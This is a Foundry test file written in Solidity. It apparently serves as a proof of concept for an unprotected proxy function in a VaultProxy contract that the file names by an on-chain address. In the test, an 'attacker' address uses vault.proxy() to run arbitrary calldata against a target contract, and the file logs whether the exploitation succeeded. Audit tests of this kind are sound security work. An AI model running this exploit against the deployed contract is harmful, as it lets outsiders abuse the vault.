// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol";

contract MaliciousTarget {
    bool public called = false;

    function execute() external payable {
        called = true;
    }
}

contract VaultProxy_Test is Test {
    VaultProxy public vault;
    MaliciousTarget public target;

    function setUp() public {
        vm.startPrank(address(0xdead));
        vault = new VaultProxy();
        vm.stopPrank();
        target = new MaliciousTarget();
    }

    function test_unprotectedProxyCall() public {
        console.log("--- BEFORE-Trigger called status ---");
        bool initialCalledStatus = target.called();
        console.log("Initial called status: %s", initialCalledStatus);

        address attacker = makeAddr("attacker");
        bytes memory data = abi.encodeWithSignature("execute()");

        console.log("--- Trigger unprotectedProxyCall by attacker ---");
        vm.prank(attacker);
        vault.proxy(address(target), data);

        console.log("--- AFTER-Trigger called status ---");
        bool finalCalledStatus = target.called();
        console.log("Final called status: %s", finalCalledStatus);

        console.log("--- Differential Check Result ---");
        if (initialCalledStatus != finalCalledStatus) {
            console.log(
                "State changed: Initial %s -> Final %s -> Exploitation SUCCESSFUL",
                initialCalledStatus,
                finalCalledStatus
            );
        } else {
            console.log(
                "State unchanged: Initial %s = Final %s -> Exploitation FAILED",
                initialCalledStatus,
                finalCalledStatus
            );
        }

        // Vulnerability existence verdict
        if (initialCalledStatus == false && finalCalledStatus == true) {
            console.log("Vulnerability Exists: Unprotected proxy call allows arbitrary contract execution");
        } else {
            console.log("Vulnerability not Exist: State change verification failed");
        }
        
        // Original assertion preserved
        assertTrue(finalCalledStatus, "Vulnerability: Unprotected proxy call allowed attacker to execute arbitrary contract");
    }
}